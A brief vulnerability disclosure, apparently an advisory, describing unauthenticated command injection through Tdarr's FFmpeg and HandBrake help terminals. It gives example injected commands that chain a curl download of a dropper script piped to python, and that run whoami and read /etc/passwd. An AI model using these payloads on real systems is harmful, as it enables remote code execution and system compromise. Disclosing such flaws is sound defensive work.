Exploit:

The Help tab contains a terminal for both FFmpeg and HandBrake. These terminals do not include input filtering which allows the user to chain commands and spawn a reverse shell.

eg. `--help; curl http://192.168.0.2/dropper.py | python` or `--help;whoami;cat /etc/passwd`.

Tdarr is not protected by any auth by default and no credentials are required to trigger RCE
